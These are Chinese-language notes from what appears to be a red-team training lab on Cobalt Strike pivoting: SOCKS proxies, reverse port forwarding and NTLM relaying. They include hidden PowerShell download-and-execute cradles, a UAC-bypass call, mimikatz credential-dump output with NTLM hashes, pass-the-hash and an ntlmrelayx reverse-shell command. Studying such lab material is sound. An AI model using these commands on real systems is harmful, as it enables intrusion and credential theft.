# SOCKS Proxies

1. CS创建socket
```
socks 1080
```

![img](1659515539543.jpg)

2. 设置proxychains

设置proxychains
```
vi /etc/proxychains4.conf
```

![img](1659515683605.jpg)

查看CS服务端（kali）上监听的转发端口

```
ss -lpnt
```

![img](1659515773959.jpg)

3. 使用

nmap验证，需要加```-Pn```和```-sT```

![img](1659516222390.jpg)

cme验证

![img](1659518671269.jpg)


# Windows Apps


# Browsers

FoxyProxy设置

![img](1659519528397.jpg)

浏览器上访问，现在流量走1080端口上的sock4服务

![img](1659519619361.jpg)


# Metasploit

1. 打开beacon里的```View > Proxy Pivots```,点击Tunnel按钮

![img](1659519840063.jpg)

出现一行文字：
```
setg Proxies socks4:192.168.3.67:1080
```

2. 打开msf

把上面文字复制到msfconsole

![img](1659520016347.jpg)

现在所有msf模块的流量都走1080端口的socks4

尝试使用smb 登录模块，走的是socks4，登录成功

![img](1659520233753.jpg)


# Reverse Port Forwards

lab里一共有四个域，互相之间的通信关系 

![img](https://rto-assets.s3.eu-west-2.amazonaws.com/reverse-port-forward/domain-traffic-flow.png?width=1920)

## netsh

这个实验是```dc-2.dev.cyberbotic.io```做中继，把```ad.subsidiary.external```上4444端口的流量绑定到自身

此时，```dc-1.cyberbotic.io```连接```dc-2.dev.cyberbotic.io```上的4444端口，就等于访问```ad.subsidiary.external```的4444端口


在操作```dc-2.dev.cyberbotic.io```上操作，添加一个反向端口转发，名字```v4tov4```
```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp
```

显示上面的转发
```
netsh interface portproxy show v4tov4
```


删除上面的反向端口转发
```
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

1. ```ad.subsidiary.external```监听4444端口访问

![img](1659771422544.png)


2. ```dc-2.dev.cyberbotic.io```做一个反向端口转发，把```ad.subsidiary.external```4444端口上的流量转发到本地4444端口

![img](1659771509846.png)


3. 在```dc-1.cyberbotic.io```上连接```dc-2.dev.cyberbotic.io```上的4444端口

![img](1659771713194.png)


4. ```ad.subsidiary.external```监听到4444端口被连接

![img](1659771687607.png)


## rportfwd 

1.  在dc2上现在是无法直接访问10.10.5.120的80端口的

![img](1659772122017.png)


2. 在WKSTN-1，把本地8080端口流量转到teamserver的80端口

![img](1659833457084.png)


netstat查看本地监听已建立

![img](1659833502959.png)


3. 现在在dc2上访问WKSTN-1的8080端口，就相当于访问teamserver的80端口


![img](1659833623409.png)


![img](1659833659363.png)


## rportfwd_local

Beacon 也有一个rportfwd_local命令。rportfwd将流量传输到 Team Server，rportfwd_local将流量转到 Cobalt Strike 客户端的机器

1. 在kali上运行一个CS客户端操作

![img](1659833998724.png)


kali起一个py服务器，监听8080端口

![img](1659834129257.png)

2. 转发wkstn-1的8080端口到本地（kali的CS客户端）的8080端口上

![img](1659834205925.png)

3. 访问

在wkstn-1上访问本地的8080端口，实际上访问到的是kali的CS客户端上的8080端口内容

![img](1659834373533.png)

在wkstn-2上访问wkstn-1的8080端口，访问到的也是kali的CS客户端上的8080端口内容

![img](1659834547953.png)

4. kali查看

![img](1659834594995.png)


## NTLM Relaying

powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

整个攻击的操作流程图见这里：

![img](https://rto-assets.s3.eu-west-2.amazonaws.com/relaying/overview.png?width=1920)


### wkstn-2做中继

1. 上传WinDivert64.sys到靶机，需要system权限，不同于教材，这里选择wkstn-2做中继


![img](1659835501447.png)

2. load PortBender，在CS加载[PortBender](https://github.com/praetorian-inc/PortBender)模块


![img](1659835334105.png)

3. 查看PortBender，把本地流量445转发到高端口8445


![img](1659835587282.png)

4. 把wkstn-2上的8445端口流量转发到teamserver的445端口。因为这是在kali上开启的客户端，所以teamserver的ip填127.0.0.1


![img](1659835677989.png)

5. 开启sokes
```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```

6. 开启ntlmrelayx，这里指定只监听10.10.17.68（srv-2）的smb流量，所以收到的也是srv-2的哈希
```
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server
```

7. 用dir命令在wkstn-2上列出wkstn-2里一个不存在的目录，触发NTLM Relay攻击

![img](1659836422147.png)

8. ntlmrelayx收到10.10.17.68过来的smb流量，并且得到了hash

![img](1659836366440.png)

9. 利用得到的srv-2哈希pth访问srv-2

![img](1659837671373.png)


### wkstn-1做中继

powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"


powershell.exe  -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"

```
C:\Users\bfarmer>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 12 2021 23:10:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : WKSTN-1 / S-1-5-21-689523297-2952850621-452819511

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : f16d61a4e64b333d6956a11f99680edb

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000003f0 (1008)
User : lapsadmin
LM   :
NTLM : e6ee93155fb69bca283883ff75b363f9

mimikatz #
```


sekurlsa::pth /user:Administrator /domain:dev.cyberbotic.io /ntlm:f16d61a4e64b333d6956a11f99680edb /run:powershell.exe


## ntlmrelayx.py当收到连接时利用-c参数执行一条命令

返回一个rev shell
```
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.132:8080/b\")"'
```

